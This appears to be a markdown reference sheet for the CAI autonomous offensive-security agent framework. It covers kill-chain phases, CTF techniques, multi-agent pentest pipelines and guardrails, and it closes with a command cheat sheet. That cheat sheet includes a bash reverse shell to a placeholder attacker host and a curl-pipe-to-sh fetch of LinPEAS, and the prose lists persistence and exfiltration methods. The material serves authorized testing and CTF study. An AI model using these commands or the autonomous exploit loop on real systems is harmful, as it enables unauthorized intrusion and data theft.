# CAI — Cybersecurity AI Framework (aliasrobotics/CAI)

## Overview
CAI is an open-source agentic cybersecurity framework built on ReACT (Reasoning + Acting) loops.
It runs autonomous multi-agent pipelines for offensive/defensive security, CTF challenges, and bug bounty work.
Source: https://github.com/aliasrobotics/CAI

---

## ReACT Agent Loop
Every CAI agent follows: **Reason → Act → Observe → repeat** until the task objective is met.
- Reason: decompose the target, choose the next tool or technique
- Act: execute (nmap, exploit, privesc, lateral move)
- Observe: parse output, update internal state
- Iterate: refine strategy based on result

---

## Kill-Chain Phases CAI Covers

### 1. Reconnaissance
- Passive: OSINT, Shodan, Censys, WHOIS, certificate transparency, Google dorks
- Active: `nmap -sV -sC -O -A`, `masscan`, `gobuster`/`ffuf` for web dirs, `nikto`
- Service fingerprinting: banner grabbing, version detection
- Output: structured target profile (open ports, services, versions, OS guess)

### 2. Exploitation
- Vuln matching: CVE lookup against detected versions (NVD, Exploit-DB, searchsploit)
- Web: SQLi (sqlmap), XSS, SSRF, LFI/RFI, XXE, IDOR, broken auth, JWT attacks
- Network: Metasploit modules, custom PoC scripts (Python/Ruby)
- Agent auto-selects and runs the highest-confidence exploit for the target
- Payload generation: msfvenom, reverse shells (bash/nc/Python/powershell)

### 3. Privilege Escalation
- Linux: sudo -l, SUID/GUID binaries, writable /etc/passwd, cron jobs, kernel exploits (DirtyCow, overlayfs), Docker socket, capabilities (`getcap`)
- Windows: token impersonation, SeImpersonatePrivilege, AlwaysInstallElevated, unquoted service paths, DLL hijacking, PrintSpoofer, JuicyPotato
- Tools: LinPEAS, WinPEAS, PEASS-ng, PrivescCheck, PowerUp

### 4. Lateral Movement
- Pass-the-Hash / Pass-the-Ticket (Mimikatz, Impacket)
- SMB pivoting, SSH agent forwarding, ProxyChains
- Active Directory: BloodHound/SharpHound path analysis, DCSync, Kerberoasting, AS-REP roasting, Golden/Silver ticket
- Remote exec: psexec, wmiexec, smbexec, CrackMapExec, Evil-WinRM

### 5. Exfiltration
- Data staging: compress + encrypt before moving (`tar cz | openssl enc`)
- Transfer: DNS exfiltration, HTTPS C&C channels, steganography
- Cloud: S3 bucket misconfiguration abuse, SAS token theft

### 6. Command & Control (C&C)
- Lightweight reverse shells with persistence (cron, rc.local, WMI subscriptions, registry Run keys)
- Covenant, Metasploit multi/handler, custom Python C&C

---

## CTF-Specific Techniques

### Web
- Burp Suite interception, repeater, intruder for fuzz
- JWT none-algorithm attack, weak secret brute-force
- Template injection: Jinja2 (`{{7*7}}`), Twig, Smarty
- Deserialization: Java ObjectInputStream, PHP unserialize, pickle
- GraphQL introspection, batch queries, IDOR via ID enumeration

### Binary / Pwn
- `file`, `checksec` — initial recon on binary
- `strings`, `ltrace`, `strace` — dynamic analysis
- GDB/pwndbg/peda — breakpoints, stack inspection
- Buffer overflow: find offset (`cyclic`), control EIP/RIP, ret2libc, ROP chains
- Format string: `%n` write, GOT overwrite
- Heap exploitation: tcache poisoning, fastbin dup, House of Force

### Crypto
- Identify cipher: frequency analysis, known-plaintext, block size detection
- RSA: small e (Coppersmith), common modulus, Wiener's attack, factor DB lookup
- Symmetric: ECB mode detection (block duplication), CBC bit-flip, padding oracle
- Tools: RsaCtfTool, dcode.fr, CyberChef, hashcat (offline hash cracking)

### Forensics / Steganography
- `binwalk`, `foremost`, `strings` for embedded files
- `steghide`, `zsteg`, `stegsolve` for image steg
- `volatility3` for memory dump analysis (process list, cmdline, dumpfiles)
- Wireshark / `tshark` pcap analysis: filter `tcp.stream`, export objects, follow streams

### Reverse Engineering
- Ghidra / IDA Free — decompile to pseudo-C
- `objdump -d`, `radare2 -A` — disassemble
- Dynamic: `frida`, `x64dbg` (Windows), `angr` for symbolic execution
- Obfuscation: XOR key recovery, base64 + rot variants, custom alphabets

---

## CAI Multi-Agent Patterns

### Parallel Scout + Exploit
- Agent A: Recon (nmap, gobuster, OSINT)
- Agent B: Exploit candidate research (searchsploit, NVD lookup)
- Coordinator: merges results, selects highest-confidence attack path

### Pentest Pipeline
```
recon_agent → vuln_scan_agent → exploit_agent → privesc_agent → report_agent
```

### Bug Bounty Mode
- Scope check first (always respect in-scope domains)
- Automated: subdomain enum (amass, subfinder), endpoint crawl (katana), param discovery (arjun)
- Manual-assist: flag interesting findings for human review before exploitation

---

## Guardrails (built into CAI)
- Scope enforcement: refuses to act on out-of-scope targets
- Rate limiting: respects `--rate` to avoid IDS triggering
- Authorization check prompt before destructive actions
- Prompt injection detection: rejects adversarial instructions from target responses
- Audit log: all actions recorded for debrief / report generation

---

## Quick-Reference Commands

```bash
# Port scan
nmap -sV -sC -p- --min-rate 5000 <target>

# Web dir brute
gobuster dir -u http://<target> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# SQLi test
sqlmap -u "http://<target>/page?id=1" --dbs --batch

# LinPEAS
curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Reverse shell (bash)
bash -i >& /dev/tcp/<attacker>/<port> 0>&1

# Crack hash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# BloodHound ingestor
python3 bloodhound.py -u <user> -p <pass> -d <domain> -c All
```

---

## Tools Index
| Category       | Tools |
|----------------|-------|
| Recon          | nmap, masscan, amass, subfinder, shodan CLI |
| Web            | gobuster, ffuf, nikto, sqlmap, Burp Suite |
| Exploit        | Metasploit, searchsploit, pwntools |
| Privesc        | LinPEAS, WinPEAS, PowerUp |
| AD Attack      | Impacket, BloodHound, CrackMapExec, Mimikatz |
| Forensics      | volatility3, binwalk, steghide, Wireshark |
| Reversing      | Ghidra, angr, radare2, pwndbg |
| Crypto         | RsaCtfTool, hashcat, CyberChef |
| C&C            | Metasploit handler, Covenant |
